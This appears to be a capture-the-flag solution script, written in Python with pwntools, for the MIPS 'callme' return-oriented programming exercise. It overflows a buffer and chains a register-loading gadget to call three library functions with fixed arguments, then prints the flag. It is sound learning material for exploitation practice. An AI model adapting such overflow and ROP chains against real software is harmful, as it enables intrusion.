#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('callme_mipsel')
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

gs='''
b *pwnme+204
c
'''

# Gadgets
# 0x00400bb0 : lw $a0, 0x10($sp) ; lw $a1, 0xc($sp) ; lw $a2, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; 
g_pop_t9a2a1a0 = 0x00400bb0

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


callme_one = elf.plt["callme_one"]
callme_two = elf.plt["callme_two"]
callme_three = elf.plt["callme_three"]

log.info(f"{callme_one=:x}")
log.info(f"{callme_two=:x}")
log.info(f"{callme_three=:x}")

offset=0x24

PL=b"A"*offset
for adrcall in [callme_one, callme_two, callme_three ]:
    PL+=p32(g_pop_t9a2a1a0)    # t9
    PL+=p32(0)        
    PL+=p32(adrcall)           # t9
    PL+=p32(0xd00df00d)        # a2
    PL+=p32(0xcafebabe)        # a1
    PL+=p32(0xdeadbeef)        # a0

io.recvuntil(b"> ")

io.sendline(PL)

io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()

